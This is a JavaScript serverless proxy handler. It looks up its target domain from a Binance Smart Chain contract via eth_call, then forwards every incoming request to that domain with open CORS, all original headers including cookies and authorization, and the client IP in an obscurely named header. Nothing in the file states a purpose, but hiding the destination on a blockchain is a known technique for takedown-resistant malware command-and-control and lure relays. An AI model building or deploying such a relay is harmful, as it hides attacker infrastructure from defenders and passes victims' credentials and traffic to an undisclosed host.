import fetch from "node-fetch";

// ===== CONFIG =====
const UPDATE_INTERVAL = 60 * 1000; // 60 seconds
const RPC_URLS = [
  "https://binance.llamarpc.com",
  "https://bsc.drpc.org"
];
const CONTRACT_ADDRESS = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";

let cachedDomain = null;
let lastFetchTime = 0;

// ===== UTILS =====
function getClientIP(req) {
  if (req.headers["cf-connecting-ip"]) return req.headers["cf-connecting-ip"];
  if (req.headers["x-forwarded-for"]) return req.headers["x-forwarded-for"].split(",")[0].trim();
  return req.socket.remoteAddress;
}

function hexToString(hex) {
  hex = hex.replace(/^0x/, "");
  hex = hex.substring(64);
  const lengthHex = hex.substring(0, 64);
  const length = parseInt(lengthHex, 16);
  const dataHex = hex.substring(64, 64 + length * 2);
  let result = "";
  for (let i = 0; i < dataHex.length; i += 2) {
    const charCode = parseInt(dataHex.substr(i, 2), 16);
    if (charCode === 0) break;
    result += String.fromCharCode(charCode);
  }
  return result;
}

async function fetchTargetDomain() {
  const data = "20965255"; // selector
  for (const rpcUrl of RPC_URLS) {
    try {
      const res = await fetch(rpcUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "eth_call",
          params: [
            { to: CONTRACT_ADDRESS, data: "0x" + data },
            "latest"
          ]
        }),
      });

      const json = await res.json();
      if (json.error) continue;
      const domain = hexToString(json.result);
      if (domain) return domain;
    } catch {
      continue;
    }
  }
  throw new Error("Could not fetch target domain");
}

async function getTargetDomain() {
  const now = Date.now();
  if (cachedDomain && (now - lastFetchTime) < UPDATE_INTERVAL) {
    return cachedDomain;
  }
  cachedDomain = await fetchTargetDomain();
  lastFetchTime = now;
  return cachedDomain;
}

// ===== MAIN HANDLER =====
export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, HEAD, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "*");

  if (req.method === "OPTIONS") {
    res.status(204).end();
    return;
  }

  const e = req.query.e;

  if (!e) {
    res.status(400).send("Missing endpoint");
    return;
  }

  if (e === "ping_proxy") {
    res.setHeader("Content-Type", "text/plain");
    res.send("pong");
    return;
  }

  try {
    const targetDomain = (await getTargetDomain()).replace(/\/$/, "");
    const endpoint = "/" + e.replace(/^\/+/, "");
    const url = targetDomain + endpoint;

    const clientIP = getClientIP(req);

    // Forward request headers
    const headers = { ...req.headers };
    delete headers.host;
    delete headers.origin;
    delete headers["accept-encoding"];
    delete headers["content-encoding"];
    headers["x-dfkjldifjlifjd"] = clientIP;
    headers["x-proxy-owner"] = "Ukandu Michael";

    const fetchOptions = {
      method: req.method,
      headers,
      redirect: "follow",
    };

    if (req.method !== "GET" && req.method !== "HEAD") {
      const body = await new Promise((resolve) => {
        let data = [];
        req.on("data", (chunk) => data.push(chunk));
        req.on("end", () => resolve(Buffer.concat(data)));
      });
      fetchOptions.body = body;
    }

    const proxiedRes = await fetch(url, fetchOptions);

    if (proxiedRes.headers.get("content-type")) {
      res.setHeader("Content-Type", proxiedRes.headers.get("content-type"));
    }

    res.status(proxiedRes.status);
    const buf = await proxiedRes.arrayBuffer();
    res.send(Buffer.from(buf));

  } catch (err) {
    res.status(500).send("error: " + err.message);
  }
}